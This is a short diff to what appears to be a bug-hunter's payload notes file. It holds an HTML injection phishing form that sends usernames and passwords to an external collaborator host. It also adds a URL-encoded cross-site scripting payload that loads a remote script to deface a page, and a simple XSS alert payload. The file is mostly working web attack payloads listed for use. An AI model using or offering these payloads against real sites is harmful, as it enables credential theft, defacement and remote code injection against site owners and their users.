@@ -33,6 +33,15 @@ ATO:
 PHISHING:
 <h3>Please login to proceed</h3> <form action=http://zgj49ubrlvka5wgrek9bc0eryi49s0io7.oastify.com>
 Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br>
+
+Deface:
+e%27"()%26%25<zzz>%27"><script%20src=https://jso-tools.z-x.my.id/raw/~/RD9CXXDM006AY></script>
+
+Xss Alert:
+e%27"()%26%25<zzz><ScRiPt%20>alert(9155)</ScRiPt>
+
+
+--------------------------------------------------------------------------------------------------------------------------
 <input type="submit" value="Login"></br>
 
 My preferred fuzzing method:
